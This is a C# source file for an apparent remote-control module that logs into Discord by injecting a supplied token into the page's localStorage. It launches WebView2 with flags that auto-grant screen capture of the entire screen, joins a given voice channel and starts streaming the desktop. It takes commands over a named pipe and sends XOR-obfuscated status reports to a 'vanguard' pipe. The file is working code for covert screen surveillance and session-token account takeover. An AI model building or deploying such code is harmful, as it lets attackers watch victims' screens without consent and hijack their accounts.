using System;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Web.WebView2.WinForms;
using Microsoft.Web.WebView2.Core;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO.Pipes;
using System.Runtime.InteropServices.Marshalling;

namespace DiscordProSvc
{
    public class Program
    {
        private static string _token = "";
        private static string _channelUrl = "";
        private static IPEndPoint _tgEndpoint = new IPEndPoint(IPAddress.Loopback, 51337);
        private static HiddenForm _form;

        [STAThread]
        static void Main(string[] args)
        {
            // Application configuration for WinForms under NativeAOT
            // Parse arguments more robustly
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--token" && i + 1 < args.Length) _token = args[++i];
                else if (args[i] == "--url" && i + 1 < args.Length) _channelUrl = args[++i];
            }

            if (string.IsNullOrEmpty(_token)) return;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            _form = new HiddenForm();
            
            // Start Named Pipe Listener for real-time commands
            Thread listenerThread = new Thread(PipeListenerLoop);
            listenerThread.IsBackground = true;
            listenerThread.Start();

            Application.Run(_form);
        }

        private static void PipeListenerLoop()
        {
            while (true)
            {
                try
                {
                    using (var pipeServer = new NamedPipeServerStream("vanguard_discord_cmd", PipeDirection.In))
                    {
                        pipeServer.WaitForConnection();
                        using (var reader = new StreamReader(pipeServer))
                        {
                            string cmd = reader.ReadToEnd()?.Trim().ToLower();
                            if (!string.IsNullOrEmpty(cmd))
                            {
                                _form.Invoke(new Action(() => _form.HandleRemoteCommand(cmd)));
                            }
                        }
                    }
                }
                catch { Thread.Sleep(1000); }
            }
        }

        public static void SendStatus(string status)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(status);
                byte[] salt = Encoding.UTF8.GetBytes("c0mpl3x+S@lt#99");
                byte[] xorData = new byte[data.Length];
                for (int i = 0; i < data.Length; i++) xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                string base64 = Convert.ToBase64String(xorData);

                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
                {
                    pipeClient.Connect(1000);
                    using (var writer = new StreamWriter(pipeClient))
                    {
                        writer.Write(base64);
                        writer.Flush();
                    }
                }
            }
            catch { }
        }

        public class HiddenForm : Form
        {
            private WebView2 _webView;

            public HiddenForm()
            {
                this.Text = "EmoCore Discord Debug";
                this.ShowInTaskbar = true;
                this.WindowState = FormWindowState.Normal;
                this.Size = new Size(1280, 800);
                this.FormBorderStyle = FormBorderStyle.Sizable;
                this.Opacity = 1;
                this.CenterToScreen();

                _webView = new WebView2();
                _webView.Dock = DockStyle.Fill;
                this.Controls.Add(_webView);

                // Defer init AFTER the message pump is running (avoids async deadlock in NativeAOT)
                this.Shown += (s, e) => InitializeWebView();
            }

            private async void InitializeWebView()
            {
                try 
                {
                    SendStatus("[Discord] ⏳ Инициализация WebView2...");
                    
                    // Add Screen Sharing Flags
                    var options = new CoreWebView2EnvironmentOptions(
                        additionalBrowserArguments: "--use-fake-ui-for-media-stream --enable-usermedia-screen-capturing --auto-select-desktop-capture-source=\"Entire screen\""
                    );
                    var env = await CoreWebView2Environment.CreateAsync(null, null, options);
                    
                    await _webView.EnsureCoreWebView2Async(env);
                    SendStatus("[Discord] 🌐 WebView2 готов. Переход в Discord...");
                    
                    _webView.CoreWebView2.Navigate("https://discord.com/login");
                    _webView.CoreWebView2.NavigationCompleted += OnNavigationCompleted;
                }
                catch (Exception ex)
                {
                    SendStatus($"[Discord] ❌ Ошибка инициализации: {ex.Message}");
                    Application.Exit();
                }
            }

            public async void HandleRemoteCommand(string cmd)
            {
                switch (cmd)
                {
                    case "stream":
                        SendStatus("[Discord] 🖥️ Запуск трансляции...");
                        await ExecuteDiscordAction("stream");
                        break;
                    case "mic":
                        await ExecuteDiscordAction("mic");
                        break;
                    case "deaf":
                        await ExecuteDiscordAction("deaf");
                        break;
                    case "stop":
                        Application.Exit();
                        break;
                }
            }

            private async Task ExecuteDiscordAction(string action)
            {
                string script = "";
                if (action == "stream")
                {
                    script = @"(async () => {
                        let btn = document.querySelector('button[aria-label*=""Share Your Screen""], button[aria-label*=""экрана""]');
                        if (btn) {
                            btn.click();
                            await new Promise(r => setTimeout(r, 1000));
                            let goLive = Array.from(document.querySelectorAll('button')).find(b => 
                                b.innerText.toLowerCase().includes('go live') || b.innerText.toLowerCase().includes('эфир')
                            );
                            if (goLive) goLive.click();
                            return 'STREAM_STARTED';
                        }
                        return 'BTN_NOT_FOUND';
                    })()";
                }
                else if (action == "mic") script = "document.querySelector('button[aria-label*=\"Mute\"], button[aria-label*=\"Unmute\"]').click()";
                else if (action == "deaf") script = "document.querySelector('button[aria-label*=\"Deafen\"], button[aria-label*=\"Undeafen\"]').click()";

                if (!string.IsNullOrEmpty(script))
                    await _webView.CoreWebView2.ExecuteScriptAsync(script);
            }

            private async void OnNavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
            {
                if (e.IsSuccess && _webView.Source.ToString().Contains("login"))
                {
                    SendStatus("[Discord] 🔑 Внедрение токена...");
                    string tokenScript = @"
                        (function(token) {
                            setInterval(() => {
                                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `""${token}""`;
                            }, 50);
                            setTimeout(() => { location.reload(); }, 2500);
                        })('" + _token + "');";
                    
                    await _webView.CoreWebView2.ExecuteScriptAsync(tokenScript);
                    _webView.CoreWebView2.NavigationCompleted -= OnNavigationCompleted;
                    
                    await Task.Delay(8000);
                    if (!string.IsNullOrEmpty(_channelUrl))
                    {
                        SendStatus("[Discord] 🔊 Переход в голосовой канал...");
                        _webView.CoreWebView2.Navigate(_channelUrl);
                        
                        // Auto-join voice script
                        await Task.Delay(5000);
                        string joinScript = @"(async () => {
                            let btns = Array.from(document.querySelectorAll('button'));
                            let join = btns.find(b => b.innerText.toLowerCase().includes('join voice') || b.innerText.toLowerCase().includes('присоединиться'));
                            if (join) join.click();
                        })()";
                        await _webView.CoreWebView2.ExecuteScriptAsync(joinScript);
                        SendStatus("✅ <b>Discord Pro:</b> Онлайн и в канале.");

                        // Auto-start stream after a short delay
                        await Task.Delay(3000);
                        await ExecuteDiscordAction("stream");
                    }
                }
            }
        }
    }
}
